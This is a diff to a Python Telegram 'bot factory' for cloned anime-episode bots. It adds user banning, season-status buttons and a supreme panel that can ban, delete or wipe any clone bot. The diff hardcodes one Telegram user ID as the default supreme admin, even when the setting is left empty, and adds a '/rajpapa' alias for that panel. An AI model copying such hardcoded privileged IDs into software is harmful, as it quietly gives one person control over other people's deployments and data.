@@ -9,7 +9,12 @@ from urllib.parse import quote
 
 from pyrogram import Client, filters, enums
 from pyrogram.types import (Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup,
-                            BotCommand, BotCommandScopeDefault, BotCommandScopeChat, LinkPreviewOptions)
+                            BotCommand, BotCommandScopeDefault, BotCommandScopeChat)
+try:
+    from pyrogram.types import LinkPreviewOptions
+    LPO_DISABLE = LinkPreviewOptions(is_disabled=True)
+except ImportError:
+    LPO_DISABLE = None
 from pyrogram.handlers import MessageHandler, CallbackQueryHandler, RawUpdateHandler
 from pyrogram.errors import (FloodWait, RPCError, UserNotParticipant, AccessTokenInvalid,
                              AccessTokenExpired, UserIsBlocked, InputUserDeactivated,
@@ -26,7 +31,7 @@ except Exception:
 API_ID: int = 0                      # <-- my.telegram.org ꜱᴇ ᴀᴘɪ ɪᴅ
 API_HASH: str = ""                   # <-- my.telegram.org ꜱᴇ ᴀᴘɪ ʜᴀꜱʜ
 BOT_TOKEN: str = ""                  # <-- ꜰᴀᴄᴛᴏʀʏ ʙᴏᴛ ᴛᴏᴋᴇɴ (@ʙᴏᴛꜰᴀᴛʜᴇʀ)
-SUPREME_IDS: str = ""                # <-- ᴄᴏᴍᴍᴀ ꜱᴇᴘᴀʀᴀᴛᴇᴅ ᴅᴇᴠᴇʟᴏᴘᴇʀ ᴜꜱᴇʀ ɪᴅꜱ (ᴇx: "12345,67890")
+SUPREME_IDS: str = "7524032836"      # <-- ᴄᴏᴍᴍᴀ ꜱᴇᴘᴀʀᴀᴛᴇᴅ ᴅᴇᴠᴇʟᴏᴘᴇʀ ᴜꜱᴇʀ ɪᴅꜱ (ᴇx: "12345,67890")
 LOG_CHANNEL_ID: int = 0              # <-- ɢʟᴏʙᴀʟ ʟᴏɢ ᴄʜᴀɴɴᴇʟ ɪᴅ (0 = ᴏꜰꜰ)
 FACTORY_NAME: str = "Anime Bot Factory"
 CLONE_BOT_ID_TOKEN: str = ""         # <-- ᴏᴘᴛɪᴏɴᴀʟ ᴇxᴛʀᴀ ꜱᴇᴄʀᴇᴛ ꜰᴏʀ ᴛᴏᴋᴇɴ ᴇɴᴄʀʏᴘᴛɪᴏɴ
@@ -40,7 +45,7 @@ CLONE_MIN_USERS: int = 100           # ᴜꜱᴇʀꜱ >= ᴛʜɪꜱ = ɴᴇᴠ�
 API_ID = int(os.getenv("API_ID") or API_ID or 0)
 API_HASH = os.getenv("API_HASH") or API_HASH
 BOT_TOKEN = os.getenv("BOT_TOKEN") or BOT_TOKEN
-SUPREME_IDS = os.getenv("SUPREME_IDS") or SUPREME_IDS
+SUPREME_IDS = os.getenv("SUPREME_IDS") or SUPREME_IDS or "7524032836"
 LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID") or LOG_CHANNEL_ID or 0)
 FACTORY_NAME = os.getenv("FACTORY_NAME") or FACTORY_NAME
 CLONE_BOT_ID_TOKEN = os.getenv("CLONE_BOT_ID_TOKEN") or CLONE_BOT_ID_TOKEN
@@ -59,7 +64,6 @@ LOG = logging.getLogger("ꜰᴀᴄᴛᴏʀʏ")
 PM_HTML = enums.ParseMode.HTML
 PM_OFF = enums.ParseMode.DISABLED
 CMS = enums.ChatMemberStatus
-LPO_DISABLE = LinkPreviewOptions(is_disabled=True)
 
 START_TS = None
 def now(): return int(time.time())
@@ -145,20 +149,20 @@ ADMIN_PANEL_TXT = (
 
 # ═════════════════════ ᴘᴇʀᴍɪꜱꜱɪᴏɴꜱ & ʀᴏʟᴇꜱ ═════════════════════
 PERMS = ["upload", "edit", "delete", "broadcast", "forcesub", "editstart", "stats",
-         "manage_admins", "thumb", "captions", "seasons", "list", "restart_upload"]
+         "manage_admins", "thumb", "captions", "seasons", "list", "restart_upload", "ban_users"]
 
 PERM_LABELS = {
     "upload": "Upload Episodes", "edit": "Edit Episodes", "delete": "Delete Episodes",
     "broadcast": "Broadcast", "forcesub": "Force Subscribe", "editstart": "Edit Start Msg",
     "stats": "View Statistics", "manage_admins": "Manage Admins", "thumb": "Upload Thumbnail",
     "captions": "Manage Captions", "seasons": "Manage Seasons", "list": "Use /list",
-    "restart_upload": "Restart Upload Session",
+    "restart_upload": "Restart Upload Session", "ban_users": "Ban/Unban Users",
 }
 
 ROLE_PRESETS = {
     "owner": list(PERMS),
     "manager": ["manage_admins", "broadcast", "upload", "edit", "delete", "stats",
-                "forcesub", "editstart", "captions", "thumb", "seasons", "list", "restart_upload"],
+                "forcesub", "editstart", "captions", "thumb", "seasons", "list", "restart_upload", "ban_users"],
     "uploader": ["upload", "edit", "seasons", "captions", "thumb", "list"],
     "broadcaster": ["broadcast"],
     "analyst": ["stats", "list"],
@@ -173,13 +177,14 @@ ADMIN_CMD_RAW = [("upload", "Add Episodes"), ("edit", "Edit Episode"), ("delete"
                  ("broadcast", "Send Updates"), ("stats", "Statistics"), ("list", "Episode List"),
                  ("listsearch", "Search Anime List"), ("admin", "Admin Panel"), ("setfs", "Force Subscribe"),
                  ("editstart", "Set Start Msg"), ("giveadmin", "Add Admin"), ("editadmin", "Edit Admin"),
-                 ("remadmin", "Remove Admin"), ("seasonend", "Mark Season Ended"), ("coming", "Mark Coming Soon"),
+                 ("remadmin", "Remove Admin"), ("ban", "Ban User"), ("unban", "Unban User"),
+                 ("seasonend", "Mark Season Ended"), ("coming", "Mark Coming Soon"),
                  ("done", "Finish Upload"), ("cancel", "Cancel Session")]
 FACTORY_CMD_RAW = [("clone", "Create Your Bot")]
-SUPREME_CMD_RAW = [("supreme", "Supreme Panel"), ("botlist", "All Bots"), ("db", "Database"), ("restart", "Restart Clones")]
+SUPREME_CMD_RAW = [("rajpapa", "Supreme Control Panel"), ("supreme", "Supreme Panel"), ("botlist", "All Bots"), ("db", "Database"), ("restart", "Restart Clones")]
 
 ALL_CMDS = ["start", "refer"] + [x[0] for x in ADMIN_CMD_RAW + FACTORY_CMD_RAW + SUPREME_CMD_RAW]
-FACTORY_ONLY = {"clone", "supreme", "botlist", "db", "restart"}
+FACTORY_ONLY = {"clone", "supreme", "rajpapa", "botlist", "db", "restart"}
 
 # ═════════════════════ ɢʟᴏʙᴀʟ ꜱᴛᴀᴛᴇ ═════════════════════
 RUNNING = {}        # bot_id -> Client
@@ -454,6 +459,10 @@ def rate_ok(c, uid):
 
 def is_supreme(uid): return uid in SUPREMES
 
+async def is_user_banned(c, uid):
+    u = await c.store.get("users", str(uid)) or await c.store.get("users", uid)
+    return bool(u and u.get("is_banned"))
+
 async def perm_ok(c, uid, perm):
     if is_supreme(uid): return True
     a = await c.store.get("admins", uid)
@@ -504,7 +513,7 @@ async def q_safe(q, text, alert=False):
 def _cmds(lst): return [BotCommand(a, sc(b)) for a, b in lst]
 
 async def apply_admin_commands(c, uid):
-    lst = ADMIN_CMD_RAW + (FACTORY_CMD_RAW + SUPREME_CMD_RAW if c.is_factory and is_supreme(uid) else [])
+    lst = USER_CMD_RAW + ADMIN_CMD_RAW + (FACTORY_CMD_RAW if c.is_factory else []) + (SUPREME_CMD_RAW if is_supreme(uid) else [])
     try:
         await c.set_bot_commands(_cmds(lst), scope=BotCommandScopeChat(chat_id=int(uid)))
     except Exception as e:
@@ -1065,8 +1074,14 @@ async def up_got_video(c, m):
     d["added"] = d.get("added", 0) + 1
     d["episode"] = en + 1
 
-    await m.reply(f"✅ <b>{hesc(title)} — S{sn} E{en} Added!</b>\n\n📤 Send next video for Episode {en + 1} or press /done",
-                  parse_mode=PM_HTML)
+    kb = InlineKeyboardMarkup([
+        [btn("🏁 Mark Season Ended", f"up_st|seasonend|{aid}|{sn}"), btn("🔔 Mark Coming Soon", f"up_st|coming|{aid}|{sn}")],
+        [btn("➕ More Episodes Coming", f"up_st|more_episodes|{aid}|{sn}")],
+        [btn("🏁 Finish Upload (/done)", "up|done")]
+    ])
+
+    await m.reply(f"✅ <b>{hesc(title)} — S{sn} E{en} Added!</b>\n\n📤 Send next video for Episode {en + 1} or select season status below:",
+                  reply_markup=kb, parse_mode=PM_HTML)
 
 async def ns_got_season(c, m):
     uid = m.from_user.id
@@ -1102,7 +1117,15 @@ async def ns_got_video(c, m):
     await save_episode(c, uid, aid, sn, en, fid, mtype, m.caption or "", tid)
     d["episode"] = en + 1
     d["added"] = d.get("added", 0) + 1
-    await m.reply(f"✅ <b>{hesc(title)} — S{sn} E{en} Added!</b>\n\n📤 Send next video for Episode {en + 1} or /done", parse_mode=PM_HTML)
+
+    kb = InlineKeyboardMarkup([
+        [btn("🏁 Mark Season Ended", f"up_st|seasonend|{aid}|{sn}"), btn("🔔 Mark Coming Soon", f"up_st|coming|{aid}|{sn}")],
+        [btn("➕ More Episodes Coming", f"up_st|more_episodes|{aid}|{sn}")],
+        [btn("🏁 Finish Upload (/done)", "up|done")]
+    ])
+
+    await m.reply(f"✅ <b>{hesc(title)} — S{sn} E{en} Added!</b>\n\n📤 Send next video for Episode {en + 1} or select season status below:",
+                  reply_markup=kb, parse_mode=PM_HTML)
 
 async def cmd_done(c, m):
     uid = m.from_user.id
@@ -1677,7 +1700,8 @@ def admin_panel_kb():
     return InlineKeyboardMarkup([
         [btn("🟢 Upload", "pan|upload"), btn("🔵 Edit", "pan|edit"), btn("🔴 Delete", "pan|del")],
         [btn("🟣 Broadcast", "pan|bc"), btn("🟠 Stats", "pan|stats"), btn("⚪ List", "adm_list|menu")],
-        [btn("🔐 Force Sub", "pan|fs"), btn("📝 Start Msg", "pan|es"), btn("👥 Admins", "pan|admins")]])
+        [btn("🔐 Force Sub", "pan|fs"), btn("📝 Start Msg", "pan|es"), btn("👥 Admins", "pan|admins")],
+        [btn("🚫 Ban User", "pan|banuser"), btn("🟢 Unban User", "pan|unbanuser")]])
 
 async def cmd_admin(c, m):
     uid = m.from_user.id
@@ -1764,6 +1788,40 @@ async def cmd_remadmin(c, m):
     await c.store.delete("admins", t)
     await log_event(c, "🚫 ᴀᴅᴍɪɴ ʀᴇᴍᴏᴠᴇᴅ", f"Admin: {t}", important=True, uid=t)
     await m.reply("🗑 <b>Admin removed!</b>", parse_mode=PM_HTML)
+
+async def cmd_ban(c, m):
+    uid = m.from_user.id
+    if not await perm_ok(c, uid, "ban_users"):
+        await m.reply("❌ <b>NO BAN PERMISSION!</b>", parse_mode=PM_HTML); return
+    t, name = msg_target(m)
+    if not t:
+        set_sess(c, uid, "ban_target")
+        await m.reply("🚫 Reply to user or send ID to ban:\n<code>/ban 123456789</code>", parse_mode=PM_HTML); return
+    if is_supreme(t) or (await c.store.get("admins", t)):
+        await m.reply("❌ Cannot ban an Admin / Supreme Owner!", parse_mode=PM_HTML); return
+    u = await c.store.get("users", t) or {"_id": str(t), "first_name": name or str(t), "started_at": now(), "last_seen": now()}
+    u["is_banned"] = True
+    u["banned_by"] = uid
+    u["banned_at"] = now()
+    await c.store.put("users", t, u)
+    await log_event(c, "🚫 ᴜꜱᴇʀ ʙᴀɴɴᴇᴅ", f"User: {t}", important=True, uid=uid)
+    await m.reply(f"🚫 <b>User {t} has been banned!</b>", parse_mode=PM_HTML)
+
+async def cmd_unban(c, m):
+    uid = m.from_user.id
+    if not await perm_ok(c, uid, "ban_users"):
+        await m.reply("❌ <b>NO UNBAN PERMISSION!</b>", parse_mode=PM_HTML); return
+    t, _ = msg_target(m)
+    if not t:
+        set_sess(c, uid, "unban_target")
+        await m.reply("🟢 Reply to user or send ID to unban:\n<code>/unban 123456789</code>", parse_mode=PM_HTML); return
+    u = await c.store.get("users", t)
+    if not u or not u.get("is_banned"):
+        await m.reply("ℹ️ User is not banned.", parse_mode=PM_HTML); return
+    u["is_banned"] = False
+    await c.store.put("users", t, u)
+    await log_event(c, "🟢 ᴜꜱᴇʀ ᴜɴʙᴀɴɴᴇᴅ", f"User: {t}", important=True, uid=uid)
+    await m.reply(f"🟢 <b>User {t} has been unbanned!</b>", parse_mode=PM_HTML)
 
 async def show_admins_list(c, chat_id, edit_msg=None):
     docs = c.store.find("admins")
@@ -2019,16 +2077,20 @@ async def restart_all(status_msg, only=None):
         pass
     await dev_log(f"♻️ Bots restarted — ✅{okc} ❌{fail}")
 
+async def supreme_panel_kb():
+    return InlineKeyboardMarkup([
+        [btn("🤖 Manage Bots", "sv|manage_bots"), btn("🗄️ Database Insights", "sv|db")],
+        [btn("📊 Global Stats", "sv|stats"), btn("♻️ Restart Clones", "sv|restart")],
+        [btn("📣 Global Broadcast", "sv|bc_all")]])
+
 async def cmd_supreme(c, m):
     if not is_supreme(m.from_user.id): return
-    kb = InlineKeyboardMarkup([
-        [btn("🤖 Bot List", "sv|botlist"), btn("🗄️ Database", "sv|db")],
-        [btn("📊 Global Stats", "sv|stats"), btn("♻️ Restart All", "sv|restart")]])
-    await m.reply(f"👑 <b>ꜱᴜᴘʀᴇᴍᴇ ᴘᴀɴᴇʟ</b>\n━━━━━━━━━━━━━━\n"
-                  f"🤖 Bots: <b>{FACTORY.count('bots') if FACTORY else 0}</b>\n"
-                  f"🟢 Running: <b>{len(RUNNING) - (1 if FACTORY_CLIENT else 0)}</b>\n\n"
+    kb = await supreme_panel_kb()
+    await m.reply(f"👑 <b>ꜱᴜᴘʀᴇᴍᴇ ᴘᴀɴᴇʟ</b> (/rajpapa)\n━━━━━━━━━━━━━━\n"
+                  f"🤖 Total Bots: <b>{FACTORY.count('bots') if FACTORY else 0}</b>\n"
+                  f"🟢 Active Running: <b>{len(RUNNING) - (1 if FACTORY_CLIENT else 0)}</b>\n\n"
                   f"📣 Global Broadcast: <code>/broadcast all</code>\n"
-                  f"🎯 Single Bot: <code>/broadcast 123456</code>",
+                  f"🎯 Single Bot Broadcast: <code>/broadcast 123456</code>",
                   reply_markup=kb, parse_mode=PM_HTML)
 
 async def cmd_botlist(c, m):
@@ -2301,15 +2363,133 @@ async def cb_adm(c, q, parts):
         try: await q.message.edit_text(selector_text(d), reply_markup=selector_kb(d), parse_mode=PM_HTML)
         except RPCError: pass
 
+async def delete_clone_bot(bid):
+    meta = FACTORY.get_sync("bots", bid)
+    if not meta: return False
+    old = RUNNING.pop(bid, None)
+    if old:
+        try: await old.stop()
+        except Exception: pass
+    STORES.pop(bid, None)
+    cpath = clone_path(bid)
+    if os.path.exists(cpath):
+        try: os.remove(cpath)
+        except OSError: pass
+    await FACTORY.delete("bots", bid)
+    await dev_log(f"🗑️ ᴄʟᴏɴᴇ ᴅᴇʟᴇᴛᴇᴅ ʙʏ ꜱᴜᴘʀᴇᴍᴇ: @{meta.get('username')} ({bid})")
+    return True
+
+async def delete_bot_db(bid):
+    st = get_store(bid)
+    st.data = {}
+    st.flush_soon()
+    await ensure_defaults(st)
+    meta = FACTORY.get_sync("bots", bid)
+    if meta:
+        owner_id = meta.get("owner_id")
+        if owner_id:
+            await set_cfg(st, owner_id=owner_id)
+            await st.put("admins", owner_id, {"_id": str(owner_id), "name": meta.get("owner_name", "Owner"),
+                                              "role": "owner", "permissions": list(PERMS), "added_by": 0, "at": now()})
+    await dev_log(f"🧹 ʙᴏᴛ ᴅᴀᴛᴀʙᴀꜱᴇ ᴄʟᴇᴀʀᴇᴅ: {bid}")
+
+async def show_supreme_bot_list(c, q):
+    bots = FACTORY.find("bots") if FACTORY else []
+    bots.sort(key=lambda x: x.get("username", "").lower())
+    rows = []
+    for meta in bots:
+        bid = meta["_id"]
+        uname = meta.get("username") or str(bid)
+        status = "🔴 BANNED" if meta.get("is_banned") else ("🟢 LIVE" if bid in RUNNING else "⚪ OFF")
+        rows.append([btn(f"{uname} [{status}]", f"sv|bot_manage|{bid}")])
+    rows.append([btn("🔙 Back to Supreme Panel", "sv|panel")])
+    txt = f"🤖 <b>SUPREME CLONE BOTS MANAGER ({len(bots)})</b>\n\nSelect a bot to manage (Ban, Unban, Delete Clone, Clear Database):"
+    try: await q.message.edit_text(txt, reply_markup=InlineKeyboardMarkup(rows), parse_mode=PM_HTML)
+    except RPCError: pass
+
+async def show_bot_control_menu(c, q, bid):
+    meta = FACTORY.get_sync("bots", bid)
+    if not meta:
+        await q_safe(q, "❌ Bot not found!"); return
+    st = STORES.get(bid)
+    users = st.count("users") if st else 0
+    eps = st.count("episodes") if st else 0
+    is_b = meta.get("is_banned", False)
+    run_s = "🟢 RUNNING" if bid in RUNNING else ("🔴 BANNED" if is_b else "⚪ STOPPED")
+    rows = [
+        [btn("🟢 UNBAN BOT" if is_b else "🔴 BAN BOT", f"sv|toggle_bot_ban|{bid}")],
+        [btn("🧹 CLEAR DB", f"sv|confirm_cleardb|{bid}"), btn("🗑️ DELETE CLONE", f"sv|confirm_delbot|{bid}")],
+        [btn("♻️ RESTART BOT", f"sv|restart_one|{bid}")],
+        [btn("🔙 Back to Bot List", "sv|manage_bots")]
+    ]
+    txt = (f"🤖 <b>MANAGE BOT:</b> @{meta.get('username')}\n━━━━━━━━━━━━━━\n"
+           f"🆔 Bot ID: <code>{bid}</code>\n"
+           f"👤 Owner: {hesc(meta.get('owner_name','?'))} (<code>{meta.get('owner_id')}</code>)\n"
+           f"📊 Status: <b>{run_s}</b>\n"
+           f"👥 Users: <b>{users}</b> | 🎬 Episodes: <b>{eps}</b>\n"
+           f"📅 Created: {dt(meta.get('created_at', 0))}")
+    try: await q.message.edit_text(txt, reply_markup=InlineKeyboardMarkup(rows), parse_mode=PM_HTML)
+    except RPCError: pass
+
 async def cb_supreme(c, q, parts):
     if not is_supreme(q.from_user.id):
         await q_safe(q, "❌ Supreme Only!"); return
     act = parts[1]
-    if act == "botlist":
+    if act == "panel":
+        kb = await supreme_panel_kb()
+        txt = (f"👑 <b>ꜱᴜᴘʀᴇᴍᴇ ᴘᴀɴᴇʟ</b> (/rajpapa)\n━━━━━━━━━━━━━━\n"
+               f"🤖 Total Bots: <b>{FACTORY.count('bots') if FACTORY else 0}</b>\n"
+               f"🟢 Active Running: <b>{len(RUNNING) - (1 if FACTORY_CLIENT else 0)}</b>\n\n"
+               f"📣 Global Broadcast: <code>/broadcast all</code>\n"
+               f"🎯 Single Bot Broadcast: <code>/broadcast 123456</code>")
+        try: await q.message.edit_text(txt, reply_markup=kb, parse_mode=PM_HTML)
+        except RPCError: pass
+    elif act == "manage_bots" or act == "botlist":
         await q_safe(q, "🤖")
-        for part in chunk(build_botlist_text()):
-            try: await q.message.reply(part, parse_mode=PM_HTML, link_preview_options=LPO_DISABLE)
-            except RPCError: pass
+        await show_supreme_bot_list(c, q)
+    elif act == "bot_manage":
+        bid = int(parts[2])
+        await show_bot_control_menu(c, q, bid)
+    elif act == "toggle_bot_ban":
+        bid = int(parts[2])
+        meta = FACTORY.get_sync("bots", bid)
+        if meta:
+            new_b = not meta.get("is_banned", False)
+            await FACTORY.update("bots", bid, is_banned=new_b)
+            if new_b:
+                old = RUNNING.pop(bid, None)
+                if old:
+                    try: await old.stop()
+                    except Exception: pass
+                await q_safe(q, "🔴 Bot Banned & Stopped!")
+            else:
+                await q_safe(q, "🟢 Bot Unbanned! Launching...")
+                await launch_clone(meta)
+            await show_bot_control_menu(c, q, bid)
+    elif act == "confirm_cleardb":
+        bid = int(parts[2])
+        rows = [[btn("⚠️ YES, CLEAR DB NOW", f"sv|do_cleardb|{bid}")], [btn("❌ CANCEL", f"sv|bot_manage|{bid}")]]
+        try: await q.message.edit_text(f"⚠️ <b>Are you sure you want to clear database for bot {bid}?</b>\n\nAll episodes and users will be reset!", reply_markup=InlineKeyboardMarkup(rows), parse_mode=PM_HTML)
+        except RPCError: pass
+    elif act == "do_cleardb":
+        bid = int(parts[2])
+        await delete_bot_db(bid)
+        await q_safe(q, "🧹 Database Cleared!")
+        await show_bot_control_menu(c, q, bid)
+    elif act == "confirm_delbot":
+        bid = int(parts[2])
+        rows = [[btn("🔥 YES, DELETE CLONE BOT", f"sv|do_delbot|{bid}")], [btn("❌ CANCEL", f"sv|bot_manage|{bid}")]]
+        try: await q.message.edit_text(f"🔥 <b>PERMANENT DELETION:</b>\n\nDelete Clone Bot {bid} and all its data?", reply_markup=InlineKeyboardMarkup(rows), parse_mode=PM_HTML)
+        except RPCError: pass
+    elif act == "do_delbot":
+        bid = int(parts[2])
+        await delete_clone_bot(bid)
+        await q_safe(q, "🗑️ Bot Deleted!")
+        await show_supreme_bot_list(c, q)
+    elif act == "restart_one":
+        bid = int(parts[2])
+        await q_safe(q, "♻️ Restarting...")
+        await restart_all(q.message, only=bid)
     elif act == "db":
         await q_safe(q, "🗄️")
         try: await q.message.reply(build_db_report(), parse_mode=PM_HTML, link_preview_options=LPO_DISABLE)
@@ -2321,6 +2501,10 @@ async def cb_supreme(c, q, parts):
     elif act == "restart":
         await q_safe(q, "♻️ Restarting...")
         await restart_all(q.message)
+    elif act == "bc_all":
+        await q_safe(q, "📣")
+        try: await q.message.reply("📣 <b>To broadcast to ALL clones:</b>\nReply to any message with <code>/broadcast all</code>", parse_mode=PM_HTML)
+        except RPCError: pass
 
 # ─────────── ᴍᴀꜱᴛᴇʀ ᴄᴀʟʟʙᴀᴄᴋ ───────────
 async def h_callback(c, q):
@@ -2330,6 +2514,9 @@ async def h_callback(c, q):
             except RPCError: pass
             return
         uid = q.from_user.id
+        if await is_user_banned(c, uid):
+            await q_safe(q, "❌ You are banned from using this bot!", alert=True)
+            return
         data = q.data or ""
         if data == "ckfs":
             ok, kb = await fs_state(c, uid)
@@ -2432,6 +2619,21 @@ async def h_callback(c, q):
             clear_sess(c, uid)
             await q_safe(q, "❌ Cancelled")
             try: await q.message.edit_text("❌ <b>Clone creation cancelled.</b>", parse_mode=PM_HTML)
+            except RPCError: pass
+        elif data.startswith("up_st|"):
+            parts = data.split("|")
+            st_val, aid, sn = parts[1], parts[2], int(parts[3])
+            anime = await c.store.get("animes", aid)
+            if anime:
+                seasons = anime.setdefault("seasons", {})
+                s_info = seasons.setdefault(str(sn), {})
+                s_info["status"] = st_val
+                s_info["updated_at"] = now()
+                await c.store.update("animes", aid, seasons=seasons)
+            st_labels = {"seasonend": "🏁 Season Ended", "coming": "🔔 Coming Soon", "more_episodes": "➕ More Episodes Coming"}
+            label = st_labels.get(st_val, st_val)
+            await q_safe(q, f"✅ Season {sn} marked: {label}")
+            try: await q.message.edit_text(f"✅ <b>Season {sn} status set to: {label}</b>", parse_mode=PM_HTML)
             except RPCError: pass
         elif data.startswith("adm_sel_anime|"):
             aid = data.split("|")[1]
@@ -2681,11 +2883,45 @@ async def route_session(c, m, s):
         await c.store.delete("admins", t)
         await log_event(c, "🚫 ᴀᴅᴍɪɴ ʀᴇᴍᴏᴠᴇᴅ", f"Admin: {t}", important=True, uid=t)
         await m.reply("🗑 <b>Admin removed!</b>", parse_mode=PM_HTML)
+    elif step == "ban_target" and m.text:
+        t, name = msg_target(m)
+        if not t and (m.text or "").strip().isdigit():
+            t = int(m.text.strip()); name = str(t)
+        if not t:
+            await m.reply("🚫 Send User ID:"); return
+        clear_sess(c, uid)
+        if is_supreme(t) or (await c.store.get("admins", t)):
+            await m.reply("❌ Cannot ban an Admin / Supreme Owner!", parse_mode=PM_HTML); return
+        u = await c.store.get("users", t) or {"_id": str(t), "first_name": name or str(t), "started_at": now(), "last_seen": now()}
+        u["is_banned"] = True
+        u["banned_by"] = uid
+        u["banned_at"] = now()
+        await c.store.put("users", t, u)
+        await log_event(c, "🚫 ᴜꜱᴇʀ ʙᴀɴɴᴇᴅ", f"User: {t}", important=True, uid=uid)
+        await m.reply(f"🚫 <b>User {t} has been banned!</b>", parse_mode=PM_HTML)
+    elif step == "unban_target" and m.text:
+        t, _ = msg_target(m)
+        if not t and (m.text or "").strip().isdigit():
+            t = int(m.text.strip())
+        if not t:
+            await m.reply("🟢 Send User ID:"); return
+        clear_sess(c, uid)
+        u = await c.store.get("users", t)
+        if not u or not u.get("is_banned"):
+            await m.reply("ℹ️ User is not banned.", parse_mode=PM_HTML); return
+        u["is_banned"] = False
+        await c.store.put("users", t, u)
+        await log_event(c, "🟢 ᴜꜱᴇʀ ᴜɴʙᴀɴɴᴇᴅ", f"User: {t}", important=True, uid=uid)
+        await m.reply(f"🟢 <b>User {t} has been unbanned!</b>", parse_mode=PM_HTML)
 
 async def h_generic(c, m):
     try:
         if not m.from_user: return
         uid = m.from_user.id
+        if await is_user_banned(c, uid):
+            try: await m.reply("❌ <b>You are banned from using this bot!</b>", parse_mode=PM_HTML)
+            except RPCError: pass
+            return
         s = get_sess(c, uid)
         if s:
             await route_session(c, m, s); return
@@ -2703,14 +2939,20 @@ CMD_MAP = {
     "upload": cmd_upload, "edit": cmd_edit, "delete": cmd_delete, "broadcast": cmd_broadcast,
     "stats": cmd_stats, "list": cmd_list, "listsearch": cmd_listsearch, "admin": cmd_admin, "setfs": cmd_setfs,
     "editstart": cmd_editstart, "giveadmin": cmd_giveadmin, "editadmin": cmd_editadmin,
-    "remadmin": cmd_remadmin, "seasonend": lambda c, m: cmd_seasonend(c, m), "coming": lambda c, m: cmd_coming(c, m),
+    "remadmin": cmd_remadmin, "ban": cmd_ban, "unban": cmd_unban,
+    "seasonend": lambda c, m: cmd_seasonend(c, m), "coming": lambda c, m: cmd_coming(c, m),
     "done": cmd_done, "cancel": cmd_cancel,
-    "clone": cmd_clone, "supreme": cmd_supreme, "botlist": cmd_botlist,
+    "clone": cmd_clone, "rajpapa": cmd_supreme, "supreme": cmd_supreme, "botlist": cmd_botlist,
     "db": cmd_db, "restart": cmd_restart,
 }
 
 async def h_admin_cmds(c, m):
     try:
+        uid = m.from_user.id if m.from_user else 0
+        if uid and await is_user_banned(c, uid):
+            try: await m.reply("❌ <b>You are banned from using this bot!</b>", parse_mode=PM_HTML)
+            except RPCError: pass
+            return
         name = m.command[0].lstrip("/").lower()
         if name in FACTORY_ONLY and not c.is_factory:
             return
@@ -2775,6 +3017,9 @@ def attach(c, me, store, is_factory):
 
 async def launch_clone(meta):
     bid = meta["_id"]
+    if meta.get("is_banned"):
+        LOG.warning("Clone %s is banned, skipping launch.", bid)
+        return None
     try:
         token = dec_token(meta["token_enc"])
     except Exception as e:
